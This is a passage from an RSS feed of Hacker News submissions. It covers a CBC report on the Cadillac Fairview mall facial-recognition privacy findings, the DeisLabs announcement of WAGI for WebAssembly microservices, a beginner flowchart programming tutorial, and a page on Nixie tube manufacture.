<p>You can comment this post on <a href="https://www.reddit.com/r/kde/comments/jl1pim/kdeorg_migrated_to_hugo/?">r/kde</a>
and <a href="https://news.ycombinator.com/item?id=24944537">HN</a>.</p>
</section></div>]]>
            </description>
            <link>https://carlschwan.eu/2020/10/30/kde-org-hugo.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944537</guid>
            <pubDate>Fri, 30 Oct 2020 17:19:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mall real estate company collected 5M images of shoppers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24944486">thread link</a>) | @ChrisArchitect
<br/>
October 30, 2020 | https://www.cbc.ca/news/politics/cadillac-fairview-5-million-images-1.5781735 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/politics/cadillac-fairview-5-million-images-1.5781735">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The real estate company behind some of Canada's most popular shopping centres embedded cameras inside its digital information kiosks at 12 shopping malls in major Canadian cities&nbsp;to collect millions of images — and used facial recognition technology without customers' knowledge or consent —&nbsp;according to a new investigation by the federal, Alberta and B.C. privacy commissioners.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5499879.1584406507!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/covid-19-pandemic-stores-closed.JPG"></p></div><figcaption>Cadillac Fairview, the real estate company behind some of Canada's most popular shopping centres, embedded cameras inside its digital information kiosks at 12 shopping malls across Canada, according to a new investigation.<!-- --> <!-- -->(Evan Mitsui/CBC)</figcaption></figure><p><span><p>The real estate company behind some of Canada's most popular shopping centres embedded cameras inside its digital information kiosks at 12 shopping malls in major Canadian cities&nbsp;to collect millions of images — and used facial recognition technology without customers' knowledge or consent —&nbsp;according to a new investigation by the federal, Alberta and B.C. privacy commissioners.</p>  <p>"Shoppers had no reason to expect their image was being collected by an inconspicuous camera, or that it would be used, with facial recognition technology, for analysis," said federal Privacy Commissioner Daniel Therrien&nbsp;in a statement.</p>  <p>"The lack of meaningful consent was particularly concerning given the sensitivity of biometric data, which is a unique and permanent characteristic of our body and a key to our identity."</p>  <p>According to the report, the technology&nbsp;Cadillac Fairview used&nbsp;— known as "anonymous video analytics" or AVA— took temporary digital images of the faces of individuals within the field of view of the camera in the directory.</p>  <p><strong><em>WATCH: Shoppers' privacy violated at major Canadian malls: Privacy commissioners:</em></strong></p>  <p><span><span><div><div role="button" tabindex="0" title="Shoppers’ privacy violated at major Canadian malls: Privacy commissioners"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/949/527/mall-privacy-daigle-291020.jpg" alt=""></p></div></div></div><span>Cadillac Fairview, the real estate company behind some of Canada’s biggest malls, violated the privacy of shoppers by collecting five million images without consent from cameras inside digital information kiosks, an investigation by federal, British Columbia and Alberta privacy commissioners found.<!-- --> <!-- -->2:01</span></span></span></p>  <p>It then used facial recognition software to convert those images into biometric numerical representations of&nbsp;individual faces, about five million images&nbsp;in total.</p>  <p>That sensitive personal information could be used to identify individuals based on their unique facial features, said&nbsp;the commissioners.</p>    <p>The report said the company also kept about 16 hours of video recordings, including some audio, which it had captured during a testing phase at two malls.</p>  <p>Cadillac Fairview said it&nbsp;used AVA technology&nbsp;to assess foot traffic and track shoppers' ages and genders&nbsp;— but not to identify individuals.&nbsp;</p>  <p>The company also argued shoppers were made aware of the activity through decals it placed on shopping mall entry doors that warned cameras were being used for "safety and security" and included the web address for Cadillac Fairview's&nbsp;privacy policy.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/chinook-centre-directory.jpg 300w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/chinook-centre-directory.jpg 460w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/chinook-centre-directory.jpg 620w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/chinook-centre-directory.jpg 780w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/chinook-centre-directory.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/chinook-centre-directory.jpg"></p></div><figcaption>This directory in Chinook Centre mall in south Calgary uses facial recognition technology.<!-- --> <!-- -->(Sarah Rieger/CBC)</figcaption></figure></span></p>  <p>But the commissioners said that&nbsp;wasn't good enough and did not meet the standard for meaningful consent.&nbsp;</p>  <p>"An individual would not, while using a mall directory, reasonably expect their image to be captured and used to create a biometric representation of their face, which is sensitive personal information, or for that biometric information to be used to guess their approximate age and gender," they wrote.</p>  <p>The privacy watchdogs also took issue with the way the&nbsp;five&nbsp;million images were stored.</p>  <p>Cadillac Fairview&nbsp;said the&nbsp;images taken by camera were briefly analyzed then deleted&nbsp;—&nbsp;but investigators found that the sensitive biometric information generated from the images was being stored in a centralized database by&nbsp;a third-party company,</p>  <p>"Our investigation revealed that&nbsp;[Cadillac Fairview Corporation Limited's]&nbsp;AVA&nbsp;service provider had collected and stored approximately five million numerical representations of faces on&nbsp;CFCL's behalf, on a decommissioned server, for no apparent purpose and with no justification," notes the investigation.</p>  <p>"Cadillac Fairview stated that it was unaware that the database of biometric information existed, which compounded the risk of potential use by unauthorized parties or, in the case of a data breach, by malicious actors."</p>  <h2>Company&nbsp;says technology couldn't identify people</h2>  <p>The company said the technology was used&nbsp;to detect the presence of a human face and&nbsp;assign it&nbsp;"within milliseconds"&nbsp;to an approximate age and gender category and maintains it&nbsp;did not store any images during the pilot program and was not capable of recognizing anyone.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/eaton-centre-decal.jpg 300w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/eaton-centre-decal.jpg 460w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/eaton-centre-decal.jpg 620w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/eaton-centre-decal.jpg 780w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/eaton-centre-decal.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/eaton-centre-decal.jpg"></p></div><figcaption>The decal found on the entrance doors of the CF Toronto Eaton Centre<!-- --> <!-- -->(Office of the Privacy Commissioner report)</figcaption></figure></span></p>  <p>"The five million representations referenced in the [Office of the Privacy Commissioner]&nbsp;report are not faces. These are sequences of numbers the software uses to anonymously categorize the age range and gender of shoppers in the camera's view," Cadillac Fairview spokesperson Jess Savage&nbsp;said in a statement to CBC News.</p>  <p>"The&nbsp;OPC report concludes there is no evidence that CF was using any technology for the purpose of identifying individuals."</p>  <p>CF&nbsp;suspended its&nbsp;use of cameras&nbsp;back in 2018&nbsp;when provincial and federal privacy commissioners launched their probe&nbsp;<a href="https://www.cbc.ca/news/canada/calgary/calgary-malls-1.4760964">following a CBC investigation</a>.</p>  <p>In a statement to CBC News on Thursday, the company said it has deleted the data.</p>  <p>"We subsequently deactivated directory cameras and the numerical representations and associated data have since been deleted," said&nbsp;Savage.</p>  <p>"We take the concerns of our visitors seriously and wanted to ensure they were acknowledged and addressed."</p>  <p>However, the three commissioners said they have concerns about the company's plans going forward.</p>    <p>"The commissioners remain concerned that Cadillac Fairview refused their request that it commit to ensuring express, meaningful consent is obtained from shoppers should it choose to redeploy the technology in the future," said&nbsp;the commissioners'&nbsp;statement.</p>  <h2>No fines under Canadian law</h2>  <p>Savage said Cadillac Fairview&nbsp;accepted and implemented all the recommendations&nbsp;"with the exception of those that speculate about hypothetical future uses of similar technology."</p>  <p>The investigation found the technology was used&nbsp;in five provinces&nbsp;at the following malls:</p>  <ul>   <li>CF Market Mall (Calgary)</li>   <li>CF Chinook Centre (Calgary)</li>   <li>CF Richmond Centre (Richmond, B.C.)</li>   <li>CF Pacific Centre (Vancouver)</li>   <li>CF Polo Park (Winnipeg)</li>   <li>CF Toronto Eaton Centre (Toronto)</li>   <li>CF Sherway Gardens (Toronto)</li>   <li>CF Fairview Mall (Toronto)</li>   <li>CF Lime Ridge (Hamilton, Ont.)</li>   <li>CF Markville Mall (Markham, Ont.)</li>   <li>CF Galeries d'Anjou&nbsp;(Montreal)</li>   <li>CF Carrefour Laval (Laval, Que.)</li>  </ul>  <p>Ann Cavoukian,&nbsp;executive director at the Global Privacy and Security by Design Centre,&nbsp;said a case like this would lead to millions of dollars in fines if it had happened&nbsp;in the United States.</p>  <p>"The commissioners are doing the best they can with the limited resources they have," she said.</p>  <p>"What we have to insist upon is that private&nbsp;sector entities like Cadillac Fairview step up and protect their customers' privacy. Otherwise, why are the customers going to continue shopping there?"</p>  <p>B.C. Information and Privacy Commissioner&nbsp;Michael McEvoy&nbsp;said&nbsp;the fact he and his counterparts can't issue a fine in a&nbsp;case like this should make the case for stronger powers at both the federal and provincial levels.</p>  <p>"Fines in a case like this would have been a consideration. It is an incredible shortcoming of Canadian law," he said.</p>  <p>"We as privacy regulators don't have any authority to levy fines on companies that violate peoples'&nbsp;personal information and that should really change."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/politics/cadillac-fairview-5-million-images-1.5781735</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944486</guid>
            <pubDate>Fri, 30 Oct 2020 17:15:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WAGI: The Easiest Way to Build WebAssembly Microservices]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24944429">thread link</a>) | @gabrtv
<br/>
October 30, 2020 | https://deislabs.io/posts/introducing-wagi-easiest-way-to-build-webassembly-microservices/ | <a href="https://web.archive.org/web/*/https://deislabs.io/posts/introducing-wagi-easiest-way-to-build-webassembly-microservices/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

<p>A few months ago we released <a href="https://github.com/deislabs/krustlet">Krustlet</a>, a Kubernetes Kubelet that executes WebAssembly payloads instead of Docker containers</p>

<p>Today, we are open sourcing another experimental WebAssembly effort: the <a href="https://github.com/deislabs/wagi">WebAssembly Gateway Interface (WAGI)</a>. Pronounced “waggy” (and inspired by <a href="https://deislabs.io/images/moar_puppy.jpg">some</a> of the <a href="https://deislabs.io/images/puppy.jpg">puppies</a> on our team), WAGI is the easiest way to build WebAssembly microservices.</p>

<p>WAGI is for writing HTTP response handlers. It uses the <a href="https://wasi.dev/">WASI</a> POSIX-like system to expose an HTTP request to a WebAssembly module. Rather than requiring developers to learn new frameworks or work directly with network sockets, WAGI uses basic features like environment variables and files.</p>

<blockquote>
<p>What does it mean to be an “experimental” project? DeisLabs does a fair amount of R&amp;D. These projects aren’t likely to be the <em>next Helm</em>, but we hope that releasing them will be useful to others working in the same space.</p>
</blockquote>

<h2 id="writing-hello-world-for-wagi">Writing “Hello World” for WAGI</h2>

<p>The best way to get started is to look at a simple “Hello World” example. You can write WAGI scripts in any language that can compile to WASM32-WASI. Here we will give an example from Rust.</p>

<pre><code>fn main() {
    println!("Content-Type: text/plain");
    println!();
    println!("Hello world");
}
</code></pre>

<p>That’s it. You don’t need so much as an import. No external dependencies, no elaborate frameworks… just write some data to standard output.</p>

<p>When it comes to WAGI modules, there are only a few things to know:</p>

<ul>
<li>Write output to STDOUT</li>
<li>Read environment variables for request information</li>
<li>Accept uploads through STDIN</li>
</ul>

<h3 id="writing-output">Writing Output</h3>

<p>Sending data to a web client is as easy as writing to <code>STDOUT</code>. Like a regular HTTP message, there are two parts to a WAGI response:</p>

<ul>
<li>A set of headers, which must contain either a <code>content-type</code> or a <code>location</code>.</li>
<li>A body</li>
</ul>

<p>Between the two is an empty line. Our Rust code above sent this to <code>STDOUT</code>:</p>

<pre><code>Content-Type: text/plain

Hello world
</code></pre>

<p>While there are a few other headers you can set, the only one you need is <code>Content-Type</code> (which is not case-sensitive).</p>

<p>In most languages, writing to standard output is built in to the core libraries, making it easy to write responses.</p>

<h3 id="using-environment-variables">Using Environment Variables</h3>

<p>An incoming HTTP request also has headers. A typical HTTP request looks something like this:</p>

<pre><code>GET /hello?greet=matt HTTP/1.1
Host: foo.example.com
User-Agent: curl/7.64.1
Accept: */*

</code></pre>

<p>When WAGI gets a request, it parses the header into environment variables. Here’s a quick WAGI module that prints out all of the environment variables. Again, it’s in Rust, but we could use other languages to do this.</p>

<pre><code>fn main() {
    println!("Content-Type: text/plain");
    println!("\n### Env Vars ###");
    std::env::vars().for_each(|v| {
        println!("{} = {}", v.0, v.1);
    });
}
</code></pre>

<p>The output of the above will show a list of environment variables, which will look something like this:</p>

<pre><code>HTTP_HOST = foo.example.com
SERVER_NAME = foo.example.com
SERVER_SOFTWARE = WAGI/1
GATEWAY_INTERFACE = CGI/1.1
HTTP_USER_AGENT = curl/7.64.1
X_FULL_URL = http://foo.example.com/hello?greet=matt
REQUEST_METHOD = GET
SERVER_PROTOCOL = http
PATH_INFO = /env
HTTP_ACCEPT = */*
SERVER_PORT = 80
PATH_TRANSLATED = /env
QUERY_STRING = greet=matt
</code></pre>

<p>Note that WAGI did quite a bit of processing for you. Frequently, a web app needs to parse the URL or get the HTTP method. WAGI breaks down the information and puts them in separate environment variables so that you don’t need to worry about it.</p>

<p>Then, from inside a WebAssembly module, you can just use the built-in language features to access the environment variables. For example, in <a href="https://www.assemblyscript.org/">AssemblyScript</a> (a relative of TypeScript) your code might look something like this:</p>

<pre><code>// Get a handle to the environment variables.
let env = new Environ();

// Get the 'Host' header from the HTTP request.
let host = env.get("HTTP_HOST");
</code></pre>

<p>A similar feature in Rust would be:</p>

<pre><code>let host = std::env::var("HTTP_HOST").unwrap();
</code></pre>

<p>Environment variables are a great way to pass information into a WebAssembly module because they are so easy to access using the libraries that ship with our programming languages.</p>

<h3 id="accepting-uploads-through-stdin">Accepting Uploads through <code>STDIN</code></h3>

<p>When an HTTP client sends a <code>POST</code> or <code>PUT</code> request, the client sends a message in the request body. Sometimes this is text. Other times it is a binary file, such as an image.</p>

<p>With WAGI, this information is sent to the WebAssembly module on Standard Input (<code>STDIN</code>). <code>STDIN</code> is a special file handle. It can be read using the normal file utilities.</p>

<p>Here is a simple Rust WAGI module that echos back the content type and the file contents that the client sent:</p>

<pre><code>use std::env::var;
use std::io::{copy, stdin, stdout};

fn main() {
    // Get the content type from the request and echo it
    let default_type = "text/plain".to_string();
    let content_type = var("HTTP_CONTENT_TYPE").unwrap_or(default_type);

    // Echo the message back to the client
    println!("content-type: {}", content_type);
    println!();
    copy(&amp;mut stdin(), &amp;mut stdout());
}
</code></pre>

<p>That’s it! In a dozen lines of code using nothing but standard libraries, we built a simple echo WAGI module.</p>

<p>For more examples of WAGI modules, check out the list we maintain in the documentation for <a href="https://github.com/deislabs/wagi">the WAGI server</a>. We also put together a <a href="https://github.com/deislabs/env_wagi">Rust example module</a> that displays all of the features of WAGI.</p>

<h2 id="the-history-of-wagi-since-1996">The History of WAGI (Since 1996)</h2>

<p>Veteran web developers will take a look at this and recognize a common idiom. WAGI is based on another tremendously popular technology–one that dates back to the birth of the web.</p>

<p>In the mid 1990s, HTML pages were served statically. Authors wrote the HTML document, saved it to disk, and the web server just sent that document directly to the client.</p>

<p>But what if you wanted to execute some logic before sending the page back? That’s where Common Gateway Interface (CGI) came in. CGI defined a way to take an inbound request, break it into parts, and feed it to shell scripts. With CGI, one could use Bash, Perl, C-Shell, C, and any other language to write dynamic web pages.</p>

<p>CGI became a <em>de facto</em> standard (and later an <a href="https://tools.ietf.org/html/rfc3875">RFC</a>), with Apache and other web servers quickly adopting it. Perl and PHP both had early implementations of CGI. And many of the web’s first major applications were written as CGI scripts.</p>

<p>As WebAssembly has begun the long maturation process, the WebAssembly Systems Interface (WASI) has a securely sandboxed POSIX environment for WebAssembly modules.</p>

<p>So far, WASI provides access to environment variables, files on the file system (including STDIN and STDOUT), and a few other features. But it has no socket or HTTP support, and it is not yet multi-threaded.</p>

<p>How do you build an HTTP microservice without any networing access? Well, it turns out that CGI provided the answer: We could implement the CGI runtime and pass all the information into the module without needing to directly expose the WebAssembly module to networking. This is secure, convenient, and can be done without WebAssembly multithreading.</p>

<p>The WAGI server, written in Rust, provides a web server that answers requests. On each request, it loads the appropriate WebAssembly module, translates the HTTP request to a CGI request, and then runs the module. All of the threading and state management is handled in the WAGI server. A WAGI WebAssembly module just has to handle a single request.</p>

<p>We are excited about this because we have combined a venerable early web technology and aen emerging technology to provide a simple web service implementation. Will it be the “future of WebAssembly”? Probably not. But it provides for us today a quick and easy way of writing WebAssembly microservices.</p>

<h2 id="what-s-the-deal-with-deislabs-and-webassembly">What’s the Deal with DeisLabs and WebAssembly?</h2>

<p>The DeisLabs team at Microsoft has been increasingly involved in the cloud-native side of WebAssembly. We’ve been involved with ByteCode Alliance. We’ve contributed patches and bugfixes to a number of WebAssembly projects. We’ve written about WebAssembly. And we’ve released some early experiments.</p>

<p>So what’s going on?</p>

<p>We suspect that WebAssembly–specifically with WASI and other projects like waSCC–is poised to become a prominent technology in the cloud native space. Already, over a dozen languages have compilers that can produce WebAssembly binaries.</p>

<p>We see three major boons to WebAssembly.</p>

<ol>
<li>With its low overhead and small footprint, WebAssembly can achieve <strong>higher density in the datacenter</strong>. That means that the cost of cloud hosting goes down.</li>
<li>WebAssembly makes a fundamentally positive security assertion: The runtime cannot trust the binary it is executing. That is a perfect model for cloud computing. The default <strong>security posture of WebAssembly is already strong</strong>.</li>
<li>Because WebAssembly is <strong>architecture and operating system-neutral</strong>, the same binary (unaltered) can be run on Windows, Mac, and Linux; on Intel, ARM, and other architectures. No more recompiling for specific target platforms.</li>
</ol>

<p>We think WebAssembly has the potential for a very bright future in the datacenter, in the cloud, and on the edge. In the last few months, we’ve tried some pretty out-there experiments. Many have failed. But some, like Krustlet and WAGI, are looking promising. We are hoping to build more open source tools for this space, and are eagerly looking forward to cooperating with others in the nascent WebAssembly ecosystem.</p>

<p>We’re already toying with some networking, nanoprocesses, and security tools. We hope to share these in the coming months.</p>

<p>We hope you have a good time playing with our WAGI tool. We certainly have enjoyed making it.</p>

      
      
    </div></div>]]>
            </description>
            <link>https://deislabs.io/posts/introducing-wagi-easiest-way-to-build-webassembly-microservices/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944429</guid>
            <pubDate>Fri, 30 Oct 2020 17:11:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Computer Programming with Flowcharts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24944103">thread link</a>) | @jventura
<br/>
October 30, 2020 | https://fullspeedpython.com/blog/flowcharts/ | <a href="https://web.archive.org/web/*/https://fullspeedpython.com/blog/flowcharts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        
    <div>
        
        
            <p>
                October 30, 2020
            </p>
        
        <hr>
        <p>When I was a student back in the 90's, flowcharts were a widely used tool to teach students the basics of computer programming.
A flowchart is a diagram that represents all the necessary steps for solving a specific task.</p>
<p>In my opinion, beginner programmers should give flowcharts a chance as they provide a very simple learning model. And I think that, given the step-by-step nature of the flowchart, and with enough practice, it can give students a great confidence in their own skills. </p>
<p>Moving along.. </p>
<p>The following flowchart represents a simple program that asks the user for a number, stores it in a variable called "X", then adds 1 to "X", and finally prints the value of "X".</p>
<p><img src="https://fullspeedpython.com/static/blog/flowcharts/flowchart1.svg"></p>
<p>If you were to run this program and gave it the number 10, the program would output the number 11. If you gave it the number 20, it would output 21, and so on.</p>
<p>But computer programs can be more complex. For instance, the following flowchart represents a program that asks the user for a number, and checks if it is greater than 10.
If it is greater than 10, it writes "X is greater than 10", else it writes "X is <strong>not</strong> greater than 10".</p>
<p><img src="https://fullspeedpython.com/static/blog/flowcharts/flowchart2.svg"></p>
<p>With only these kind of blocks you can do a lot of things! Here's another program that asks the user for a number and writes "Hello World" that many times.</p>
<p><img src="https://fullspeedpython.com/static/blog/flowcharts/flowchart3.svg"></p>
<p>Basically, while X is greater than 0 it prints "Hello World" and subtracts 1. When X reaches 0 the program ends.</p>
<p>I will leave you with a couple of exercises that you can use to practice your flowcharts-fu!</p>
<h3>Basic exercises</h3>
<ol>
<li>Do a flowchart that places X=0 and then outputs it (this one's really basic).</li>
<li>Do a flowchart that ask the user for a number, multiplies it by 2 and then output it.</li>
<li>Do a flowchart that asks the user for two numbers (one at a time, you may call them X and Y), stores the sum in a variable Z, and outputs it.</li>
<li>Do a program that asks the user for two numbers (again, one at a time), and swaps the value of the variables (you may need a third temporary variable).</li>
<li>Do a program that asks the user for the number of hours, the price per hour and outputs how much is due.</li>
</ol>
<h3>Exercises with comparisons</h3>
<ol>
<li>Do a program that asks the user for two numbers and checks if they are equal or not. The program should write something like "the numbers are equal" or "the numbers are different".</li>
<li>Do a program that asks the user for two numbers and outputs the value of the larger one.</li>
<li>Do a program that asks the user for two numbers and outputs the value of the smaller one.</li>
<li>Do a program that asks for three numbers and outputs the value of the larger one.</li>
<li>Do a program that asks for three numbers, computes their average, and writes "Cold" if the average is less than 20. If it's greater or equal than 20, it should write "Warm".</li>
</ol>
<h3>Exercises with loops</h3>
<ol>
<li>Do a program that asks for a number <strong>X</strong> and writes "Hello World" <strong>X</strong> times (see above!).</li>
<li>Do a program that asks for a number <strong>X</strong> and sums all integers from <strong>X</strong> to 1. For instance, if X=4, it should do 4+3+2+1. <strong>Hint: keep the sum in another variable, and initialize it as 0.</strong></li>
<li>Do a program that asks for a number <strong>X</strong> and outputs the factorial of X. For instance, the factorial of 4 is 4x3x2x1.</li>
<li>Build a small program that implements the guess game. The program should ask user 1 for a number <strong>X</strong>. Then, user 2 must guess the number. The program must keep saying that the number <strong>Y</strong> (which is the number that user 2 inserts) is greater or smaller than <strong>X</strong>. The program should end when the numbers are equal. </li>
</ol>
<p><br>
Have fun!<br>
João Ventura</p>
<p>PS: All flowcharts were made with <a href="https://app.diagrams.net/">https://app.diagrams.net/</a>.</p>
    </div>

    </div>
</section></div>]]>
            </description>
            <link>https://fullspeedpython.com/blog/flowcharts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944103</guid>
            <pubDate>Fri, 30 Oct 2020 16:45:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dalibor Farny manufactures new Nixie tubes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943931">thread link</a>) | @beervirus
<br/>
October 30, 2020 | https://www.daliborfarny.com/manufacture/ | <a href="https://web.archive.org/web/*/https://www.daliborfarny.com/manufacture/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<!-- Google Tag Manager (noscript) -->

<!-- End Google Tag Manager (noscript) -->




<section>
	<p>
					 <video inline="" loop="" autoplay="" muted="" poster="https://www.daliborfarny.com/wp-content/uploads/2016/12/the-art-of-making.jpg">
				<source src="https://www.daliborfarny.com/wp-content/uploads/2016/12/the-art-of-making.mp4" type="video/mp4">
				Your browser does not support the video tag.
			</video> 
			</p>	
	
			
	</section>
<section id="cleaning">
					
		<div>
		<div>
			<p>01 / <span>06</span></p>
			<h2>Cleaning</h2>
			<p>
				Cleaning is an essential process of Nixie tube manufacture – all the parts going inside the tube must be cleaned prior to assembly. This ensures they will not pollute the gas mixture in the tube and provide for long life-span. Cleaning may take 25 % of the total time of making the tube.			</p>
		</div>
	</div>
	
</section>
<section id="assembly">
	<img sizes="100vw" srcset="
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_360.jpg 360w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_649.jpg 649w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_868.jpg 868w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_1049.jpg 1049w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_1208.jpg 1208w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_1359.jpg 1359w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_1429.jpg 1429w" src="https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_1429.jpg" alt="Assembling table">
	<div>
		<p>02 / <span>06</span></p>
		<h2>Assembly</h2>
		<p><img sizes="(max-width: 1400px) 100vw, 1400px" srcset="
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_360.png 360w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_668.png 668w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_888.png 888w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_1087.png 1087w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_1252.png 1252w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_1394.png 1394w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_1526.png 1526w" src="https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_1394.png" alt="Assembling hands" data-observe-visibility="">
		</p>
		<p>Assembly is the most time-consuming process, for it is very demanding on dexterity and patience. It takes more than half a year to fully train a worker.<br>
Besides putting parts together, the worker must be able to keep the right tension in the metal sheets and do precise spot welding. There are 41 parts and 26 spot welds necessary for a R|Z568M Nixie tube.</p>
	</div>
</section>
<div id="glass-work">
	<div>
		<p><img width="768" height="402" src="https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-768x402.jpg" alt="" sizes="(max-width: 1400px) 100vw, 1400px" srcset="https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-768x402.jpg 768w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-600x314.jpg 600w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-1024x536.jpg 1024w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-1536x804.jpg 1536w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-2048x1072.jpg 2048w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-360x188.jpg 360w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-1320x691.jpg 1320w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-400x209.jpg 400w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-scaled.jpg 2560w"></p><div>
			<p>03 / <span>06</span></p>
			<h2>Glass work</h2>
			<p>Working with glass is both pleasure and pain. Every seal needs to be done just right, otherwise, the glass may crack, ruining all the work done. </p>
		</div>
	</div>
</div>
<section id="evacuation">
	<div>
		<div>
			<div>
				<p>04 / <span>06</span></p>
				<h2>Evacuation and burn-in process</h2>
			</div>
			<p>
					Evacuation is probably the most difficult process to understand because things just work differently at high vacuum levels. Each tube is filled with high purity noble gas to ensure long lifespan.				</p>
		</div>

				
	</div>
</section>
<section id="base">
	<div>
		<div>
			<div>
				<p>05 / <span>06</span></p>
				<h2>Attaching the base</h2>
				<p>When the evacuation and filling process is done, the tube will get its metal base. Now it is ready for testing.</p>
			</div>
			<p><a href="https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-scaled.jpg" rel="lightbox-base" title="_LKJ3205">
					<img width="768" height="512" src="https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-768x512.jpg" alt="" srcset="https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-768x512.jpg 768w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-600x400.jpg 600w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-1024x683.jpg 1024w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-1536x1024.jpg 1536w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-2048x1365.jpg 2048w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-360x240.jpg 360w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-1320x880.jpg 1320w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-400x267.jpg 400w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-scaled.jpg 2560w" sizes="(max-width: 768px) 100vw, 768px">				</a>
			</p>
		</div>
	</div>
</section>
